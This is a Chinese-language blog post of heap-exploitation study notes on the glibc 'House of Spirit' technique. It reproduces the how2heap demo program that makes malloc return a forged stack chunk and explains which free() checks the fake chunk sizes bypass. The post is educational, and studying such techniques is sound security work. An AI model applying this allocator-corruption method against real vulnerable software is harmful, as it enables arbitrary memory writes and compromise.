---
title: "屋宇之术：Labyrinth of Houses"
published: 2025-10-04
updated: 2025-10-04
description: "你也想知道这些「屋子」里的秘密吗？"
image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.1sff5zil5e.avif"
tags: ["Pwn", "Heap", "Notes"]
category: "Notes"
draft: false
---

# House of Spirit

## Applicable Range

- latest

## Principles

人生中的第一个「house」，当然是从 Spirit 开始～

下面直接拿 [how2heap](https://github.com/shellphish/how2heap) 的 example code 来学习了，选择的是 [glibc_2.35/house_of_spirit.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_spirit.c)：

```c
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
  setbuf(stdout, NULL);

  puts("This file demonstrates the house of spirit attack.");
  puts("This attack adds a non-heap pointer into fastbin, thus leading to "
       "(nearly) arbitrary write.");
  puts("Required primitives: known target address, ability to set up the "
       "start/end of the target memory");

  puts("\nStep 1: Allocate 7 chunks and free them to fill up tcache");
  void *chunks[7];
  for (int i = 0; i < 7; i++) {
    chunks[i] = malloc(0x30);
  }
  for (int i = 0; i < 7; i++) {
    free(chunks[i]);
  }

  puts("\nStep 2: Prepare the fake chunk");
  // This has nothing to do with fastbinsY (do not be fooled by the 10) -
  // fake_chunks is just a piece of memory to fulfil allocations (pointed to
  // from fastbinsY)
  long fake_chunks[10] __attribute__((aligned(0x10)));
  printf("The target fake chunk is at %p\n", fake_chunks);
  printf(
      "It contains two chunks. The first starts at %p and the second at %p.\n",
      &fake_chunks[1], &fake_chunks[9]);
  printf("This chunk.size of this region has to be 16 more than the region (to "
         "accommodate the chunk data) while still falling into the fastbin "
         "category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by "
         "free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) "
         "and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
  puts("... note that this has to be the size of the next malloc request "
       "rounded to the internal size used by the malloc implementation. E.g. "
       "on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for "
       "the malloc parameter at the end.");
  printf("Now set the size of the chunk (%p) to 0x40 so malloc will think it "
         "is a valid chunk.\n",
         &fake_chunks[1]);
  fake_chunks[1] = 0x40; // this is the size

  printf("The chunk.size of the *next* fake region has to be sane. That is > "
         "2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for "
         "the main arena) to pass the nextsize integrity checks. No need for "
         "fastbin size.\n");
  printf("Set the size of the chunk (%p) to 0x1234 so freeing the first chunk "
         "can succeed.\n",
         &fake_chunks[9]);
  fake_chunks[9] = 0x1234; // nextsize

  puts("\nStep 3: Free the first fake chunk");
  puts("Note that the address of the fake chunk must be 16-byte aligned.\n");
  void *victim = &fake_chunks[2];
  free(victim);

  puts("\nStep 4: Take out the fake chunk");
  printf("Now the next calloc will return our fake chunk at %p!\n",
         &fake_chunks[2]);
  printf(
      "malloc can do the trick as well, you just need to do it for 8 times.");
  void *allocated = calloc(1, 0x30);
  printf("malloc(0x30): %p, fake chunk: %p\n", allocated, victim);

  assert(allocated == victim);
}
```

先说效果，这个攻击基本上就是可以令我们 malloc 返回一个任意地址，比如返回栈地址，~_然后就可以竭尽所学，做一些瑟瑟的事情了什么？我说的瑟，可是萧瑟的瑟哦～ chill bro_~

上面这个程序不难理解吧？就是先把 tcache 的 0x40 bin 填满，确保我们接下来所做的都是针对于 fastbin 的 0x40 bin 。接着关键的地方是设置了两个 fake chunk 的 size，一个是 `0x40`，紧接着它的 nextchunk size 设置为 `0x1234`，这是为了过两个检查：

首先是我们不希望进入 `__libc_free` 中的 `chunk_is_mmapped` 分支执行 `munmap_chunk`，所以伪造的第一个 chunk size 的 `M (IS_MMAPPED)` 位必须为 0。然后进入 `_int_free` 后我们第一个 chunk 的 size 必须满足 `size > MINSIZE`，否则会抛出 `free(): invalid size`，接着由于我们希望进入 fastbin，所以 size 必须在 fastbin 最大支持大小范围内，且 `chunk_at_offset(p, size) != av->top`，即紧临着的 nextchunk 不能是 top chunk，这就是为什么需要伪造两个 chunk 的原因。最还还不能满足 `chunksize_nomask (chunk_at_offset (p, size)) <= CHUNK_HDR_SZ`，即 nextchunk 的大小不能小于等于 chunk header size 和 `chunksize (chunk_at_offset (p, size)) >= av->system_mem`，即下一个 chunk 的大小大于不能大于当前 arena 内存池大小这两个检测，否则就抛出 `free(): invalid next size (fast)`。到此为止检测就绕差不多了，然后它会将这个 chunk 放到 fastbin 中，就不过多赘述了。

:::important
注意 `NON_MAIN_ARENA` 位也会有影响，得设置成 0 告诉 glibc 这是 main arena 的 chunk 。

nextchunk 的大小无关紧要，只要能绕过检测就好了，不一定非得是 fastbin 范围内的大小。
:::

感觉写了一堆没用的，还不如直接看 example code + glibc source code + 自己 debug 理解的透彻……可能是这块内容确实不好写，因为写详细的话必然得贴 glibc 代码片段，考虑到以后还有各种各样其它的 house，肯定会有重复的内容，<s>_属于是增加碳排放了，我可是坚定的环保主义者（_</s>

好麻烦……后面有时间我再研究研究怎么写吧，也可能会直接删掉，只保留部分内容也说不准？
